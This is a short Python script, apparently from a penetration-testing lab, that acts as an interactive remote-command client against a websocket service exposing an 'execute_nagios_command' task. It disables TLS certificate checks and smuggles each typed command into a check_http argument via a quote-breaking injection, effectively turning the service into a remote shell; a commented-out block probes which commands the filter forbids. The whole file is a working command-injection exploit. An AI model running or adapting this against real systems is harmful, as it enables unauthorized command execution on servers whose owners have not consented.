import websockets
import asyncio
import argparse
import ssl
import json
import _thread as thread
import threading
import sys

uniqid = ""
key = ""

def handler(message):
    """
    This functino will take the message from the server and figure out what to do with it
    """
    global uniqid
    global key

    if "uniqid" in message:
        print(f"Connection established")
        uniqid = message["uniqid"]

def toJson(task, data):
    global uniqid
    global key
    req = {
            "task": task,
            "data": data,
            "uniqid": uniqid,
            "key": key
            }

    print(f"sending message: {json.dumps(req)}")
    return json.dumps(req)

async def test(url):
    """
    This is a test to see if i understand websocket
    """

    ssl_context = ssl.SSLContext()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    global uniqid

    while True:
        cmd = input("Enter a Command: ")
        prefix = f"./check_http -I 192.168.119.120 -p 8080 -k 'test -c '{cmd}"
        #print(f"Trying: {prefix}") #print and wipe
        async with websockets.connect(url, ssl=ssl_context) as ws:
            await ws.send(toJson('execute_nagios_command', 'hello'))
            response = json.loads(await ws.recv())
            handler(response)
            await ws.send(toJson('execute_nagios_command', prefix))
            response = json.loads(await ws.recv())
            while True:
                try:
                    if response["type"] == "response":
                        while response["payload"] != "done":
                            print(response["payload"])
                            response = json.loads(await ws.recv())
                        break
                except KeyError:
                    pass
        await ws.close()
        sys.stdout.write("\033[K")

    '''
    async with websockets.connect(url,ssl=ssl_context) as ws:
        #First send a hello message to establish the connection and git the uniqid
        await ws.send("hello")
        response = await ws.recv()
        response = json.loads(response)
        handler(response)
        while True:
            cmd = input('Enter a command:')
            await ws.send(toJson('execute_nagios_command', cmd))
            while True:
                response = json.loads(await ws.recv())
                print(response)
                if response["type"] == "response":
                    print("[+] Response type returned")
                    if "Forbidden" in response["payload"]:
                        print("[+] Command is not allowed")
                        break
                    else:
                        print("[+] Command is allowed")
                        while response["category"] == "notification":
                            response = json.loads(await ws.recv())
                        break



    '''
def main():
    """
    This is the main function
    """
    parser = argparse.ArgumentParser()

    parser.add_argument('--url', '-U',
            required=True,
            dest='url',
            help="Websocket url")
    
    parser.add_argument('--key', '-K',
            required=True,
            dest='key',
            help="Websocket key")

    parser.add_argument('--verbose', '-V',
            help='Print more data',
            action='store_true')

    args = parser.parse_args()

    global key
    key = args.key

    asyncio.get_event_loop().run_until_complete(test(args.url))

if __name__ == "__main__":
    main()

